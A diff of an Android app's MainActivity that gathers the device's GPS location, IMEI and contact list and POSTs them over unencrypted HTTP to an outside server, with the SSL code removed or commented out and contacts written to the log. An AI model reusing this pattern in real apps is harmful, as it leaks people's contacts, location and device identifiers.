@@ -6,8 +6,8 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.AsyncTask;
-import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
@@ -15,33 +15,29 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
-//import com.anshulvyas.napp.utils.NoSSLv3SocketFactory;
-
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.BufferedWriter;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
 import java.util.Iterator;
-import java.util.Arrays;
 
-import javax.net.ssl.HttpsURLConnection;
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.SSLSocketFactory;
+//import com.anshulvyas.napp.utils.NoSSLv3SocketFactory;
 
 
 public class MainActivity extends AppCompatActivity {
+    private static final String TAG = "~!@#$MainActivity";
     private Button mButtonContacts;
     private Button mButtonGPS;
     private Button mButtonIMEI;
     private LocationManager locationManager;
     private LocationListener locationListener;
     private byte[] byteAddress = new byte[100];
+    private byte[] imeiBytes = new byte[15];
+    private byte[] contactsBytes = new byte[1000];
     private TextView byteAdd;
 
 
@@ -110,7 +106,19 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        new SendRequest().execute();
+        //new SendRequest().execute("hello");
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        if (getIntent() != null) {
+            if (getIntent().getExtras() != null) {
+                String contacts = getIntent().getStringExtra(ContactsActivity.KEY_INTENT_DATA);
+//                Log.i("~!@#$", getIntent().getStringExtra(ContactsActivity.KEY_INTENT_DATA));
+                new SendRequest().execute(contacts);
+            }
+        }
     }
 
     public String getIMEI(Context context){
@@ -135,22 +143,35 @@ public class MainActivity extends AppCompatActivity {
         return message;
     }
 
+
+//    public String getContactsList() {
+//
+//        ContactsActivity contactsActivity = new ContactsActivity();
+//        String contacts = contactsActivity.fetchContacts();
+//        return contacts;
+//
+//    }
+
     public class SendRequest extends AsyncTask<String, Void, String> {
 
         protected void onPreExecute(){}
 
-        protected String doInBackground(String... arg0) {
-
+        protected String doInBackground(String... args) {
             try{
-
+                String data = args[0];
+                Log.i(TAG, "doInBackground: " + data);
                 URL url = new URL("http://anshul.aeonext.com/GetRequest.ashx");
-
                 JSONObject postDataParams = new JSONObject();
-
-
+                //
+                JSONObject newPostDataParams = new JSONObject();
+                JSONObject contactsPostDataParams = new JSONObject();
+                //
                 postDataParams.put("GPS", showCurrentLocation());
-                postDataParams.put("IMEI", getIMEI(MainActivity.this));
-
+                //
+                newPostDataParams.put("IMEI", getIMEI(MainActivity.this));
+                //
+                contactsPostDataParams.put("contacts", data);
+                //
                 Log.e("httpGPS",postDataParams.toString());
 
 //                SSLContext sslcontext = SSLContext.getInstance("TLSv1");
@@ -179,9 +200,22 @@ public class MainActivity extends AppCompatActivity {
 //                writer.flush();
 //                writer.close();
                 byteAddress = getPostDataString(postDataParams).getBytes("UTF-8");
+
+                imeiBytes = getPostDataString(newPostDataParams).getBytes("UTF-8");
+
                 os.write(byteAddress);
                 System.out.println(byteAddress);
                 Log.i("BYTE_ARRAY", getPostDataString(postDataParams).getBytes().toString());
+
+                os.write(imeiBytes);
+                System.out.println(imeiBytes);
+                Log.i("IMEI_BYTE_ARRAY", getPostDataString(newPostDataParams).getBytes().toString());
+
+                String contactsDataFromServer = getPostDataString(contactsPostDataParams);
+                Log.i("CONTACTS_BYTE_ARRAY", contactsDataFromServer);
+                os.write(contactsDataFromServer.getBytes("UTF-8"));
+//                Log.i("CONTACTS_BYTE_ARRAY", getPostDataString(newPostDataParams));
+//                os.write(contactsBytes);
 
 
                 os.flush();
@@ -205,7 +239,7 @@ public class MainActivity extends AppCompatActivity {
 
                 }
                 else {
-                    return new String("false : "+responseCode);
+                    return new String("false : " + responseCode);
                 }
             }
             catch(Exception e){
@@ -218,14 +252,12 @@ public class MainActivity extends AppCompatActivity {
 
         @Override
         protected void onPostExecute(String result) {
-            Toast.makeText(getApplicationContext(), result,
-                    Toast.LENGTH_LONG).show();
+            Toast.makeText(getApplicationContext(), result, Toast.LENGTH_LONG).show();
 
         }
     }
 
     public String getPostDataString(JSONObject params) throws Exception {
-
         StringBuilder result = new StringBuilder();
         boolean first = true;
 
